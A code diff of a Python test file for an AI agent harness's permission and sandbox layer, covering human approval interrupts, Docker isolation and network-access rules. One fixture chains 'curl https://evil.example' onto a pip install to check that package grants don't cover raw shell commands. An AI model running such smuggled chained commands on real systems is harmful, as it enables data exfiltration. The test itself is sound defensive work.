@@ -9,8 +9,9 @@ from types import SimpleNamespace
 import pytest
 from langchain.agents.middleware.types import ToolCallRequest
 
+from graph.permission_policy import RunPermissionContext
 from graph.permission_resume import PermissionResumeRegistry
-from graph.session_manager import SessionManager
+from graph.session_manager import SessionManager, session_manager
 from harness.dependency_setup import detect_workspace_dependency_plan
 from harness.tool_execution import (
     PolicyDecision,
@@ -24,6 +25,137 @@ from harness.workspace_backends import (
     RestrictedHostWorkspaceBackend,
     build_workspace_execution_backend,
 )
+
+
+def test_run_permission_context_preserves_frozen_policy_version():
+    context = RunPermissionContext.from_config_snapshot(
+        {
+            "permissions": {
+                "approval_mode": "smart",
+                "policy_epoch": 7,
+                "policy_version": "tool-execution-v1",
+            }
+        }
+    )
+
+    assert context.policy_version == "tool-execution-v1"
+
+
+def test_restricted_host_backend_id_is_stable_for_workspace(tmp_path):
+    first = RestrictedHostWorkspaceBackend(root_dir=tmp_path)
+    second = RestrictedHostWorkspaceBackend(root_dir=tmp_path)
+
+    assert first.id == second.id
+
+
+@pytest.mark.asyncio
+async def test_tool_action_request_is_idempotent_across_graph_replay():
+    registry = PermissionResumeRegistry()
+    kwargs = {
+        "session_id": "session-1",
+        "query_id": "query-1",
+        "run_id": "run-1",
+        "tool_call_id": "call-1",
+        "tool_name": "execute",
+        "command": "python script.py",
+        "reason": "arbitrary_interpreter:python",
+        "risk": "execute",
+    }
+
+    first = registry.create_tool_action_request(**kwargs)
+    second = registry.create_tool_action_request(**kwargs)
+
+    assert second["id"] == first["id"]
+    assert len(registry._pending) == 1
+    assert registry.resolve(first["id"], {"type": "reject"})
+
+
+@pytest.mark.asyncio
+async def test_permission_interrupt_persists_waiting_and_resume_status(tmp_path, monkeypatch):
+    from harness import tool_execution as tool_execution_module
+    from harness.coordinators import HarnessRunCoordinator
+    from harness.models import RunStatus
+
+    session_manager.initialize(tmp_path)
+    session_manager.create_session("session-hitl")
+    coordinator = HarnessRunCoordinator(session_manager)
+    run, _ = coordinator.start_run(
+        session_id="session-hitl",
+        query_id="query-hitl",
+        objective="run python",
+        goal_mode=False,
+    )
+    coordinator.bind_execution_snapshot(
+        run,
+        {
+            "backend_mode": "restricted_host",
+            "backend_id": "restricted-host:test",
+            "workspace_id": "workspace:test",
+        },
+    )
+    coordinator.transition(run, RunStatus.RUNNING)
+    persisted = session_manager.get_run_state("session-hitl", run.run_id)
+    assert persisted is not None
+    context = RunPermissionContext.from_config_snapshot(persisted["config_snapshot"])
+    pipeline = ToolExecutionPipeline(
+        known_tools={"execute"},
+        backend_mode="restricted_host",
+        permission_context=context,
+    )
+    request = ToolCallRequest(
+        tool_call={"id": "call-hitl", "name": "execute", "args": {"command": "python script.py"}},
+        tool=None,
+        state={},
+        runtime=SimpleNamespace(
+            context={
+                "session_id": "session-hitl",
+                "query_id": "query-hitl",
+                "run_id": run.run_id,
+                "workspace_path": str(tmp_path),
+            }
+        ),
+    )
+    observed_statuses: list[str] = []
+
+    def fake_interrupt(payload):
+        current = session_manager.get_run_state("session-hitl", run.run_id)
+        observed_statuses.append(str(current["status"]))
+        request_id = payload["request"]["id"]
+        assert tool_execution_module.permission_resume_registry.resolve(
+            request_id,
+            {"type": "reject", "message": "no"},
+        )
+        return {"type": "reject", "message": "no"}
+
+    monkeypatch.setattr(tool_execution_module, "interrupt", fake_interrupt)
+
+    async def handler(_request):
+        raise AssertionError("rejected action must not execute")
+
+    result = await pipeline.awrap_tool_call(request, handler)
+
+    assert observed_statuses == ["waiting_hitl"]
+    assert session_manager.get_run_state("session-hitl", run.run_id)["status"] == "running"
+    assert result.status == "error"
+
+
+def test_docker_backend_rejects_spec_drift_within_run(tmp_path, monkeypatch):
+    workspace = tmp_path / "project"
+    workspace.mkdir()
+    manager = ProjectSandboxManager({"network_enabled": False})
+    specs = iter(
+        [
+            ("puddingclaw-test", "spec-before"),
+            ("puddingclaw-test", "spec-after"),
+        ]
+    )
+    monkeypatch.setattr(manager, "ensure_container", lambda _workspace: next(specs))
+    backend = DockerWorkspaceBackend(root_dir=workspace, manager=manager)
+
+    result = backend.execute("ls")
+
+    assert result.exit_code == 1
+    assert "specification changed after this Run started" in result.output
 
 
 @pytest.mark.parametrize(
@@ -168,6 +300,69 @@ def test_network_tool_requires_hitl_and_fingerprints_arguments(tmp_path):
     assert "example.com/private" in pipeline._action_preview(request)
 
 
+def test_smart_mode_allows_only_controlled_network_tools(tmp_path):
+    context = RunPermissionContext.from_config_snapshot(
+        {
+            "permissions": {
+                "approval_mode": "smart",
+                "policy_epoch": 4,
+            },
+            "execution": {
+                "backend_mode": "docker",
+                "backend_id": "docker:project:spec",
+                "workspace_id": "sha256:workspace",
+            },
+        }
+    )
+    pipeline = ToolExecutionPipeline(
+        known_tools={"fetch_url", "tavily_search", "execute"},
+        backend_mode="docker",
+        permission_context=context,
+    )
+
+    tavily = ToolCallRequest(
+        tool_call={"id": "search", "name": "tavily_search", "args": {"query": "AI"}},
+        tool=None,
+        state={},
+        runtime=SimpleNamespace(context={"workspace_path": str(tmp_path)}),
+    )
+    public_fetch = ToolCallRequest(
+        tool_call={
+            "id": "fetch",
+            "name": "fetch_url",
+            "args": {"url": "https://example.com/report?id=1"},
+        },
+        tool=None,
+        state={},
+        runtime=SimpleNamespace(context={"workspace_path": str(tmp_path)}),
+    )
+    private_fetch = ToolCallRequest(
+        tool_call={
+            "id": "private",
+            "name": "fetch_url",
+            "args": {"url": "http://127.0.0.1/admin"},
+        },
+        tool=None,
+        state={},
+        runtime=SimpleNamespace(context={"workspace_path": str(tmp_path)}),
+    )
+    shell_network = ToolCallRequest(
+        tool_call={
+            "id": "curl",
+            "name": "execute",
+            "args": {"command": "curl https://example.com"},
+        },
+        tool=None,
+        state={},
+        runtime=SimpleNamespace(context={"workspace_path": str(tmp_path)}),
+    )
+
+    assert pipeline._preflight(tavily).decision == PolicyDecision.ALLOW
+    assert pipeline._preflight(public_fetch).decision == PolicyDecision.ALLOW
+    assert pipeline._preflight(private_fetch).decision == PolicyDecision.DENY
+    assert pipeline._preflight(shell_network).decision == PolicyDecision.ASK
+
+
 @pytest.mark.parametrize(
     ("url", "target"),
     [
@@ -190,7 +385,11 @@ def test_fetch_url_session_scope_uses_normalized_origin(tmp_path, url, target):
         runtime=SimpleNamespace(context={"workspace_path": str(tmp_path)}),
     )
 
-    scope = ToolExecutionPipeline._session_grant_scope(request)
+    pipeline = ToolExecutionPipeline(
+        known_tools={"fetch_url"},
+        backend_mode="restricted_host",
+    )
+    scope = pipeline._session_grant_scope(request)
 
     assert scope is not None
     assert scope["target_kind"] == "network_origin"
@@ -210,7 +409,11 @@ def test_search_session_scope_reuses_network_search_tool(tmp_path):
         runtime=SimpleNamespace(context={"workspace_path": str(tmp_path)}),
     )
 
-    assert ToolExecutionPipeline._session_grant_scope(request) == {
+    pipeline = ToolExecutionPipeline(
+        known_tools={"tavily_search"},
+        backend_mode="restricted_host",
+    )
+    assert pipeline._session_grant_scope(request) == {
         "target_kind": "tool_name",
         "target": "tavily_search",
         "label": "本 Session 允许联网搜索",
@@ -315,7 +518,7 @@ def test_restricted_host_backend_has_sanitized_environment(tmp_path):
     backend = RestrictedHostWorkspaceBackend(root_dir=workspace)
 
     result = backend.execute(
-        "printf '%s\\n%s' \"$PWD\" \"$HOME\"",
+        'printf \'%s\\n%s\' "$PWD" "$HOME"',
     )
 
     assert result.exit_code == 0
@@ -385,10 +588,7 @@ def test_dependency_plan_detects_monorepo_manifests_and_isolated_mounts(tmp_path
         ("backend", ".venv"),
         ("frontend", "node_modules"),
     }
-    assert (
-        "cd /workspace/backend && python3 -m pip install --user uv "
-        "&& uv sync --frozen"
-    ) in plan.install_command
+    assert ("cd /workspace/backend && python3 -m pip install --user uv && uv sync --frozen") in plan.install_command
     assert "cd /workspace/frontend && npm ci" in plan.install_command
     assert plan.installed is False
     result = ShellPolicyAnalyzer(
@@ -409,11 +609,20 @@ def test_dependency_plan_detects_monorepo_manifests_and_isolated_mounts(tmp_path
 def test_managed_sandbox_image_is_built_when_missing(monkeypatch):
     manager = ProjectSandboxManager({})
     calls: list[list[str]] = []
+    built = False
 
     def fake_run(args, *, timeout=30):
+        nonlocal built
         calls.append(list(args))
         if args[:2] == ["image", "inspect"]:
-            return subprocess.CompletedProcess(args, 1, "", "missing")
+            return subprocess.CompletedProcess(
+                args,
+                0 if built else 1,
+                "sha256:managed-image\n" if built else "",
+                "" if built else "missing",
+            )
+        if args[0] == "build":
+            built = True
         return subprocess.CompletedProcess(args, 0, "ok", "")
 
     monkeypatch.setattr(manager, "_run", fake_run)
@@ -470,7 +679,7 @@ def test_project_container_spec_has_no_docker_socket_or_host_home(tmp_path, monk
     assert "HOME=/home/puddingclaw" in joined
 
 
-def test_docker_backend_temporarily_connects_network_for_approved_install(
+def test_docker_backend_uses_ephemeral_container_for_approved_network_command(
     tmp_path,
     monkeypatch,
 ):
@@ -488,10 +697,15 @@ def test_docker_backend_temporarily_connects_network_for_approved_install(
         "ensure_container",
         lambda _workspace: ("puddingclaw-test", "spec-hash"),
     )
+    monkeypatch.setattr(
+        manager,
+        "ensure_image",
+        lambda _image: "sha256:immutable-image",
+    )
 
     def fake_run(args, *, timeout=30):
         calls.append(list(args))
-        if args[0] == "exec":
+        if args[0] == "run":
             return subprocess.CompletedProcess(args, 0, "installed", "")
         return subprocess.CompletedProcess(args, 0, "", "")
 
@@ -501,17 +715,69 @@ def test_docker_backend_temporarily_connects_network_for_approved_install(
     result = backend.execute("npm ci")
 
     assert result.exit_code == 0
-    assert calls[0] == ["network", "disconnect", "none", "puddingclaw-test"]
-    assert calls[1] == ["network", "connect", "bridge", "puddingclaw-test"]
-    assert calls[2][:4] == ["exec", "--workdir", "/workspace", "puddingclaw-test"]
-    assert calls[3] == [
-        "network",
-        "disconnect",
-        "--force",
-        "bridge",
-        "puddingclaw-test",
+    assert len(calls) == 1
+    command = calls[0]
+    assert command[:5] == ["run", "--rm", "--network", "bridge", "--read-only"]
+    assert f"type=bind,src={workspace.resolve()},dst=/workspace,readonly" in command
+    assert ["--entrypoint", "sh"] == command[command.index("--entrypoint") : command.index("--entrypoint") + 2]
+    assert command[-3:] == ["sha256:immutable-image", "-c", "npm ci"]
+    runtime_home = manager._runtime_home_volume_name(
+        workspace.resolve(),
+        image="sha256:immutable-image",
+    )
+    assert f"type=volume,src={runtime_home},dst=/home/puddingclaw" in command
+    assert all("network connect" not in " ".join(call) for call in calls)
+
+
+def test_smart_package_scope_never_applies_to_raw_shell(tmp_path):
+    context = RunPermissionContext.from_config_snapshot(
+        {
+            "permissions": {"approval_mode": "smart", "policy_epoch": 2},
+            "execution": {
+                "backend_mode": "docker",
+                "backend_id": "docker:project:spec",
+                "workspace_id": "sha256:workspace",
+            },
+        }
+    )
+    pipeline = ToolExecutionPipeline(
+        known_tools={"execute", "install_packages"},
+        backend_mode="docker",
+        permission_context=context,
+    )
+    typed = ToolCallRequest(
+        tool_call={
+            "id": "typed",
+            "name": "install_packages",
+            "args": {"ecosystem": "python", "packages": ["pandas==2.2.0"]},
+        },
+        tool=None,
+        state={},
+        runtime=SimpleNamespace(context={"workspace_path": str(tmp_path)}),
+    )
+    chained = ToolCallRequest(
+        tool_call={
+            "id": "raw",
+            "name": "execute",
+            "args": {"command": "pip install pandas && curl https://evil.example"},
+        },
+        tool=None,
+        state={},
+        runtime=SimpleNamespace(context={"workspace_path": str(tmp_path)}),
+    )
+
+    assert pipeline._preflight(typed).risk == "package_install"
+    assert pipeline._session_grant_scope(typed) == {
+        "target_kind": "capability",
+        "target": "docker_package_install",
+        "label": "本 Session 允许在隔离安装器中安装 Skill 依赖",
+    }
+    assert pipeline._session_grant_scope(chained) is None
+    assert pipeline._required_capabilities(typed) == [
+        "execute",
+        "package_install",
+        "temporary_network",
     ]
-    assert calls[4] == ["network", "connect", "none", "puddingclaw-test"]
 
 
 def test_project_container_idle_stop_uses_generation_guard(monkeypatch):
